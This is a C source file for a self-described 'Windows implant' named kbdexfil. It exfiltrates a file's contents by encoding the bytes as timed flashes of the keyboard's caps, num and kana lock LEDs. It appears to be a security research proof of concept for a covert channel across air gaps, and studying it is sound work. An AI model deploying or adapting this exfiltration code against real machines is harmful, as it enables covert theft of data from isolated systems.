/* -----------------------------------------------------------------------------
 * File         : src/kbdexfil.c
 * Description  : Windows implant
 * Copyright    : (c) Rodger Allen 2019
 * Licence      : BSD3
 * -------------------------------------------------------------------------- */

#ifndef IMPLANT
#define IMPLANT
#endif

#include <windows.h>        // Sleep()
#include <stdio.h>          // printf()
#include <unistd.h>         // getopt()
#include <sys/stat.h>       // stat()
#include <sys/time.h>       // time()
#include <inttypes.h>
//#include <stdlib.h>


#include "global.h"
#include "encoder.h"
#include "winkbd.h"
#include "meta.h"
//#include "crc32.h"

// -------------------------------------

int processfile( FILE *fh, int timer, encoder enc );
int check_file( const char *path );
void usage( char* progname );
int main(int argc, char* argv[]);

int verbose = 0;
uint8_t parity = PARITY;

// -------------------------------------
// TODO: sort out the MAGIX

/* -------------------------------------
 * Process a file and send the LED flashes
 */
int processfile( FILE *fh, int timer, encoder enc )
{
    time_t ustart, uhead, uend, htime, ptime, ttime;
    uint8_t *meta = NULL;
    uint8_t *payload = NULL;
    uint8_t magix[MAGSZ] = MAGIX;
    size_t bsz = sizeof(magix) / sizeof(magix[0]);

    // -------------------------------------
    // *** Start ***
    trybble origState = getKeyState();
    VERBOSE(2) printf("| origState=%s\n", showLEDs(origState));
    trybble currState;      // XXX: why not set to origState??
    //trybble currState = origState;

    // -------------------------------------
    // *** Read input file ***
    // TODO: check returns properly
    struct metadata md = getFileH(fh, &payload, enc, timer);
    int msz = metaToBytes(&meta, &md);
    if (verbose) fprintf(stdout,"%s\n",showMetaData(&md));

    if (payload != NULL) {
        // -------------------------------------
        // *** Set initial LED state ***
        ustart = time(NULL);
        currState = sendInit(currState, timer, enc);
        sleeper(100);

        // -------------------------------------
        // *** Send Data ***
        flashBytes(&currState, timer, magix, bsz, enc);
        flashBytes(&currState, timer, meta, msz, enc);
        uhead = time(NULL);
        flashBytes(&currState, timer, payload, md.size, enc);
        uend = time(NULL);

        // -------------------------------------
        // *** Timing stats ***
        if(verbose) {
            htime=uhead-ustart; ptime=uend-uhead; ttime=uend-ustart;
            if(verbose>=2) {
                fprintf(stdout,"Headers: %5d bytes in %ld seconds @ %.2f bps\n",
                        (bsz+msz), htime, (float)(bsz+msz)/(float)htime);
                fprintf(stdout,"Payload: %5d bytes in %ld seconds @ %.2f bps\n",
                        md.size, ptime, (float)md.size/(float)ptime);
            }
            fprintf(stdout,"Total:   %5d (%d+%d) bytes in %ld seconds @ %.2f bps\n",
                    (bsz+msz+md.size), (bsz+msz), md.size,
                    ttime, (float)(bsz+msz+md.size)/(float)ttime);
        }
    }

    // -------------------------------------
    // *** Attempt to reset keyboard ***
    sleeper(100);
    //currState = getKeyState();
    //currState = setKeys(currState, origState);
    resetLEDs();
    sleeper(100);

    // -------------------------------------
    // *** Cleanup ***
    free(meta);
    free(payload);
    return EXIT_SUCCESS;
}

/* -------------------------------------
 * basic check for input file
 */
int check_file( const char *path )
{
    struct stat sb;
    return stat(path, &sb) == 0 && S_ISREG(sb.st_mode);
}

/* -----------------------------------------------------------------------------
 *
 */
void usage( char* progname )
{
    fprintf(stderr, "Usage: %s [-h] [-v] [-e012] [-t timer] <file>\n", progname);
    fprintf(stderr, "  version: %s\n", REVISION);
    fprintf(stderr, "    -h          this help\n");
    fprintf(stderr, "    -v          verbose\n");
    fprintf(stderr, "    -t timer    milliseconds between flashes (1-999)\n");
    fprintf(stderr, "                (default %d)\n", DEFTIMER);
    fprintf(stderr, "    -e[012]     encoding selection\n");
    fprintf(stderr, "                0 = tydbits  (caps+num) (default)\n");
    fprintf(stderr, "                1 = unibit   (kana)\n");
    fprintf(stderr, "                2 = tydbits  (caps+num)\n");
    fprintf(stderr, "                3 = trybbles (caps+num+kana)\n");
    fprintf(stderr, "    file        filename (if none given, uses <stdin>)\n");
}

/* -------------------------------------
 * main
 */
int main( int argc, char* argv[] )
{
    char *filename;
    int timer = DEFTIMER;
    int opt;
    int msecs;
    uint8_t enctype;
    FILE *fh;

    setvbuf(stdout, NULL, _IONBF, BUFSIZ);

    encoder enc = trybbleEncoder;

    while ((opt = getopt(argc, argv, "h?rRe:v::V::t:")) != -1) {
        switch (opt) {
            case 'h':case '?':
                usage(argv[0]); exit(EXIT_SUCCESS);
                break;
            case 'r':case 'R':
                resetLEDs(); exit(EXIT_SUCCESS);
                break;
            case 'e':
                if (optarg == NULL) { usage(argv[0]); exit(EXIT_FAILURE); }
                enctype = atoi(optarg);
                switch(enctype){
                    case 1:
                        enc = unibitEncoder;
                        break;
                    case 3:
                        enc = trybbleEncoder;
                        break;
                    case 2:
                    case 0:
                    default:
                        enc = tydbitEncoder;
                        break;
                }
                break;
            case 'v':case 'V':
                verbose = 1;
                if (optarg == NULL)
                    break;
                while (*optarg++ == 'v' && verbose<9)
                    verbose++;
                break;
            case 't':
                if (optarg == NULL) { usage(argv[0]); exit(EXIT_FAILURE); }
                msecs = atoi(optarg);
                if ((msecs < 1) || (msecs > 999)) {
                    fprintf(stderr, "ERR: timer out of bounds\n");
                    usage(argv[0]); exit(EXIT_FAILURE);
                }
                timer = msecs;
                break;
            default:
                usage(argv[0]);
                exit(EXIT_FAILURE);
        }
    }

    if (optind >= argc) {
        filename = "<stdin>";
        fh = stdin;
    } else {
        filename = argv[optind];
        if (check_file(filename) == 0) {
            fprintf(stderr,"ERR: file \"%s\" doesn't exist\n", filename);
            return EXIT_FAILURE;
        }
        fh=fopen(filename,"rb");
    }
    if (verbose) {
        fprintf(stdout,"filename:\t%s\n", filename);
        //fprintf(stdout,"timer: %d\n", timer);
        //fprintf(stdout,"encoding: %#04x\n", (enc.mask));
    }

    (void) processfile(fh, timer, enc);
    fclose(fh);

    if (verbose) fprintf(stdout,"\n");

    return EXIT_SUCCESS;
}

// -----------------------------------------------------------------------------
// vi: et ts=4 ai
